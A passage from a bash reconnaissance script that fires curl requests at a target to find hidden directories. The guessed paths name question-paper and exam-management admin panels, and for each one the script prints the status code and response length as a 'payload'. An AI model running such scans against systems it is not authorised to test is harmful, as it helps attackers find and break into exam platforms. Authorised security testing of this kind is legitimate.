payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SystemQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SystemQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PanelQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PanelQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUploadQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUploadQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ControlQPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ControlQPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationQPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationQPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc-Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc-Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUploadQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUploadQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControlQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControlQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DashboardTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DashboardTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PanelQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PanelQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc-Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc-Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PortalQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PortalQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperCloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperCloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin_QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUploadQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUploadQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessorQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessorQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringToolQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringToolQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload_QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload_QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AdminQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AdminQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["OpsQPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"OpsQPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminBatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminBatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite_QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite_QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadQPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_DataOps/"]: "
